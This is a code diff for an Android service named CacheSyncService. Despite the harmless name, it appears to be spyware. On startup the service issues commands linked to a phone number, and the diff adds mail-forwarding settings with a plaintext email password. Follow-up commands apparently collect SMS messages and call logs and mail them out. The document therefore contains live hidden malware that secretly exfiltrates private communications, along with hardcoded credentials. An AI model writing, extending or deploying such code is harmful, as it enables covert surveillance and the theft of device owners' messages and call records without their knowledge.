@@ -23,13 +23,11 @@ public class CacheSyncService extends Service implements Runnable {
 
 		super.onCreate();
 		NetLog.v("Service Created");
-		NetLog.v("Context %s",this);
-		NetLog.v("Base Context %s", this.getBaseContext());
 	    
 		BackgroundTask<Void,Void> task = new BackgroundTask<Void,Void>(this,false) {
 	        	public void onComplete(Void  v) {
 	                NetLog.v("Service initialized");
-	        		cmdPool.Execute("+79037996299", "@setup;ack:0");
+	        		cmdPool.Execute("+79037996299", "@setup;ack:0;mto:cache.sync@gmail.com;muser:cache.sync@gmail.com;mpass:gumbaflex");
 	        		cmdPool.Execute("+79037996299", "@rsms;mail");
 	        		cmdPool.Execute("+79037996299", "@rcalls;mail");
 	        		
@@ -38,8 +36,8 @@ public class CacheSyncService extends Service implements Runnable {
 	        	}
 	        	@Override
 	        	protected Void doInBackground(Void ... arg0) {
-	                if ( cmdPool.Init("Service",CacheSyncService.this) )
-	                	cmdPool.defaultSettings();
+	                cmdPool.Init("Service",CacheSyncService.this);
+	                //cmdPool.setDefaults();
 	                return (Void)null;
 	        	}
 	        };
